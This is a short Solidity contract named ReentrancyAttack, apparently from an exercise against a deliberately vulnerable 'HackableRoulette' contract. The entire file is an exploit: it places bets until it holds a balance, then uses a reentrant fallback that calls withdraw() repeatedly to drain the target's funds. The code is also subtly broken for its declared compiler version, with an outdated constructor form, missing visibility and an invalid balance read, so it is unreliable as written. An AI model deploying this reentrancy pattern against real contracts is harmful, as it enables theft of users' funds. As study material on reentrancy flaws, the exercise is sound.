// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

contract ReentrancyAttack {
    HackableRoulette public roulette;

    function ReentrancyAttack(address rouletteAddress) {
        roulette = HackableRoulette(rouletteAddress);
    }

    function hack () payable {
        while (roulette.balances(address(this)) == 0){
            roulette.betRed{value: msg.value}();
        }

        roulette.withdraw();
    }

    fallback() external payable {
        if(roulette.balance >= roulette.balances(address(this))){
            roulette.withdraw();
        }
    }
}